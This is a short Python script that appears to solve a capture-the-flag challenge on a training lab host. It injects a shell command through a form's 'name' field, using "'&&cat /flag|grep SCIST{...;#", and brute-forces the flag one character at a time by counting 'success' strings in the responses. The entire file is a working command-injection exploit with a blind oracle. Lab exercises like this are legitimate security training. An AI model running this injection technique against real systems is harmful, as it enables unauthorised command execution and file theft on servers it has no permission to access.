import string
import requests

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://lab.scist.org:31601',
    'Referer': 'http://lab.scist.org:31601/',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
}

data = {
    'name': "example.com'&&cat /flag|grep SCIST{;#",
}



letters = list(string.ascii_lowercase) + ["_"] + ["}"]
prefix = "example.com'&&cat /flag|grep SCIST{"
postfix = ";#"
for i in range(40):
	for c in letters:
		now = prefix+c+postfix
		#print(now)
		data['name'] = now
		response = requests.post('http://lab.scist.org:31601/', headers=headers, data=data, verify=False)
		count = response.text.count("success")
		
		if count == 2:
			prefix += c
			print(prefix)
			break

